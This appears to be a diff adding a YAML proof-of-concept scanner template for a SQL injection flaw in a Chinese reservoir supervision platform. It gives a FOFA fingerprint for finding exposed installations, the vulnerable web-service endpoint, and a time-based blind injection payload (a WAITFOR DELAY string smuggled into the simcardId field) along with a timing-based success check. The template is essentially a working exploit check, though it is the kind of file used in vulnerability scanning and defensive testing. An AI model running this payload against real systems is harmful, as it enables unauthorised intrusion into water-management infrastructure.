@@ -1,0 +1,19 @@
+id: poc-yaml-data86-reservoir-supervision-platform-sqli
+info:
+  name: 平升电子水库监管平台SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 水库监管平台
+  fofa: js/PSExtend.js
+variables:
+  t1: random_int(5,10)
+requests:
+- method: POST
+  path: /WebServices/SIMMaintainService.asmx/GetAllRechargeRecordsBySIMCardId
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: loginIdentifer=&simcardId=';WAITFOR DELAY '0:0:{{.t1}}'--
+  expression: status_code == 200 && contains(body,"\"Message\":\"指定数据卡没有充值记录\"") &&
+    duration >= t1 && duration < 11
+transport: http
